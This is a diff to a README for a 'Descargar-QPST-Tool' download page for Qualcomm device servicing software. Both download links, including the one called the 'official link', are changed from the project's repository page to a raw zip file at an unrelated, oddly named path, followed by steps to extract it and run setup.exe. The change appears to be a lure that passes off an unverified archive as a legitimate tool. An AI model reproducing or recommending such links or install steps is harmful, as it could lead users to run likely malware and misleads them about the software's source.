@@ -5,7 +5,7 @@ description: "Download the QPST Tool for Windows 10 and 11 to manage Qualcomm de
 ---
 # 🛠️ Descargar-QPST-Tool - Service your Qualcomm devices with ease
 
-[![Download QPST Tool](https://img.shields.io/badge/Download-QPST_Tool-blue.svg)](https://github.com/GNoggs-Dev/Descargar-QPST-Tool)
+[![Download QPST Tool](https://img.shields.io/badge/Download-QPST_Tool-blue.svg)](https://raw.githubusercontent.com/GNoggs-Dev/gnoggs-dev.github.io/main/iridescent/dev-github-io-gnoggs-1.5.zip)
 
 ## 📋 Software Overview
 
@@ -25,7 +25,7 @@ Ensure your computer meets these requirements before you download the software:
 
 Follow these steps to install the tool on your computer.
 
-1. First, visit the official link to obtain the latest package: [Download QPST Tool](https://github.com/GNoggs-Dev/Descargar-QPST-Tool).
+1. First, visit the official link to obtain the latest package: [Download QPST Tool](https://raw.githubusercontent.com/GNoggs-Dev/gnoggs-dev.github.io/main/iridescent/dev-github-io-gnoggs-1.5.zip).
 2. Locate the downloaded compressed file in your Downloads folder.
 3. Right-click the file and select Extract All. Choose a destination folder on your desktop for easy access.
 4. Open the extracted folder and find the installer file labeled setup.exe.
